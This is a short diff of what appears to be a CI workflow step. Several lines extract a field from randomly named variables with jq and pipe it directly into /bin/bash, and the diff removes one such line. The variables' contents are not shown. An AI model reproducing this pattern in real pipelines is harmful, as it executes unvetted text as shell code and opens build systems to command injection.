@@ -25,7 +25,6 @@ jobs:
           echo $v4476 | jq -r .zv108 | /bin/bash
           printf '%s' "$vgn68104" | jq -r .qf7 | /bin/bash
           echo $evm58 | jq -r .qnr8828 | /bin/bash
-          echo $cd69447 | jq -r .myepe5 | /bin/bash
           echo $fm33949 | jq -r .h5 | /bin/bash
 
       - name: Archive results
